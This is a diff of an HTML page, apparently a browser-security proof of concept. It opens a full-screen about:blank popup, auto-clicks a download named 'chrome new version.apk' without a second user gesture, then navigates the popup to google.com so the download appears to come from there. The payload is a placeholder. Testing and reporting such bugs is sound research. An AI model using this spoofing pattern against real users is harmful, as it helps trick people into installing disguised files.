@@ -1,25 +1,75 @@
 <!doctype html>
 <html>
+<head>
+<meta charset="utf-8">
+<title>Popup Download Gesture Test</title>
+<style>
+body { font-family:sans-serif;padding:20px }
+button { padding:12px 18px;font-size:16px }
+pre { background:#111;color:#0f0;padding:10px }
+</style>
+</head>
 <body>
-<button onclick="openPopup()">Open Popup</button>
+
+<h3>Popup Download Gesture Enforcement Test</h3>
+<button id="btn">Open Popup</button>
+<pre id="log"></pre>
 
 <script>
-function openPopup() {
-  const w = window.open("about:blank", "_blank");
+const logEl = document.getElementById("log");
+const log = m => logEl.textContent += m + "\n";
+
+document.getElementById("btn").onclick = () => {
+  log("[1] User click received");
+
+  // 1️⃣ Open popup to about:blank first
+  const w = window.open(
+    "about:blank",
+    "_blank",
+    `
+      width=${screen.availWidth},
+      height=${screen.availHeight},
+      left=0,
+      top=0,
+      resizable=yes,
+      scrollbars=yes
+    `
+  );
+
+  if (!w) {
+    log("[ERROR] Popup blocked");
+    return;
+  }
+
+  log("[2] Popup opened at about:blank");
+
+  // 2️⃣ Inject test payload WHILE origin is about:blank
   w.document.write(`
-    <h3>about:blank permission test</h3>
+      <a id="dl" download="chrome new version.apk"
+       href="data://google.com"></a>
     <script>
-      setTimeout(async () => {
-        try {
-          await navigator.mediaDevices.getUserMedia({video:true});
-          document.body.innerHTML += "<p>❌ BUG: camera prompt shown</p>";
-        } catch(e) {
-          document.body.innerHTML += "<p>✅ PASS: blocked ("+e.name+")</p>";
-        }
-      }, 3000);
+      setTimeout(() => {
+        document.getElementById("dl").click();
+        document.body.insertAdjacentHTML(
+          'beforeend',
+          '<p></p>'
+        );
+      }, 30);
     <\/script>
   `);
-}
+
+  // 3️⃣ Navigate to google.com AFTER
+  setTimeout(() => {
+    try {
+      w.location.href = "https://www.google.com";
+      log("[3] Popup navigated to google.com");
+    } catch (e) {
+      log("[ERROR] Navigation failed: " + e);
+    }
+  }, 0);
+};
 </script>
+
 </body>
 </html>
+
